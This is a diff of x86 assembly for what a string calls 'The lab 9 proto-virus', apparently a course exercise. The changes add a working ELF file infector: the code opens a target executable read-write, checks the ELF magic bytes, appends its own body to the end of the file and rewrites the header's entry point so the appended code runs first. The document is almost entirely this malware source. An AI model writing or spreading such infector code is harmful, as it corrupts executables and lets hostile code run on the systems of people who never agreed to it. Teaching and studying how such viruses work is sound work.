@@ -57,21 +57,14 @@
 	global _start
 
 	section .text
-_start:	
-	push	ebp
-	mov	ebp, esp
-	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
-	;CODE START
-	open ecx, FileName, 0x777
-	cmp eax, 0
-	jl error
-	mov FD, eax
 
+
+checkELF:
 	; Checking if file is an elf file
-	lea esi, [ELFHDR]		; Grabbing the effective address of elf header
-	read FD, esi, ELFHDR_size
-	cmp eax, 0
-	jl error
+	mov FD, eax
+	lea ecx, [ELFHDR]		; Grabbing the effective address of elf header
+	read FD, ecx, ELFHDR_size			; [ELFHDR] = E L F ........ ENTRY 
+	lea esi, [ecx]
 	cmp dword [esi], 0x464C457F
 	jne not_elf
 
@@ -79,44 +72,83 @@ _start:
 	jmp infect
 
 infect:
-	; first print Outstr to STDOUT
-	write 1, OutStr, 32
-	
+	; Print Outstr to STDOUT
+	call get_my_loc
+	sub ecx, next_i - OutStr
+	write 1, ecx, 32
+
 	; Infect the file
 	lseek FD, 0, SEEK_END
+	mov esi, eax				; save file size in esi
 	call get_my_loc
 	sub ecx, next_i - _start
 	mov edx, virus_end - _start
 	write FD, ecx, edx
+
+	; Modify entry point
+	lseek FD, 0, SEEK_SET
+	mov eax, 0x8048000 			; ELF base address
+	add eax, esi 				; Set eax to end of file
+	mov dword [ELFHDR + ENTRY], eax
+	lea ecx, [ELFHDR]		
+	write FD, ecx, ELFHDR_size	; Writing the modified header
+
 	close FD
-	cmp eax, 0
-	jl error
 	jmp VirusExit
 
 not_elf:
 	close FD
-	cmp eax, 0
-	jl error
-	write 1, Failstr, 12
+	call get_my_loc
+	sub ecx, next_i - Failstr
+	write 1, ecx, 12
 	exit -1
+
+_start:	
+	push	ebp
+	mov	ebp, esp
+	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+	;CODE START
+
+	call get_my_loc
+	sub ecx, next_i - FileName
+	mov esi, ecx
+	open esi, RDWR, 0x777
+	cmp eax, 0
+	jg checkELF ; OF, SF, ZF
+	jmp infected
+
+infected:
+	; Print Outstr to STDOUT
+	call get_my_loc
+	sub ecx, next_i - OutStr2
+	mov esi, ecx
+	write 1, esi, 37
+	close FD
+	jmp VirusExit
 
 VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
+	
 error:
-	write 1, Error, 6
+	call get_my_loc
+	sub ecx, next_i - Error
+	mov esi, ecx
+	write 1, esi, 5
 	exit -1
 
-Error:		db "ERROR", 10, 0
 FileName:	db "ELFexec", 0 ; default was with 1 but you gave us the file without it
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+OutStr2:	db "The lab 9 proto-virus strikes back!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
+Error:		db "ERROR", 10, 0
 
 
-get_my_loc:
+get_my_loc:              ; puts location in ecx
 	call next_i
 next_i:
 	pop ecx
-	ret	
+	ret
+
 PreviousEntryPoint: dd VirusExit
 virus_end:
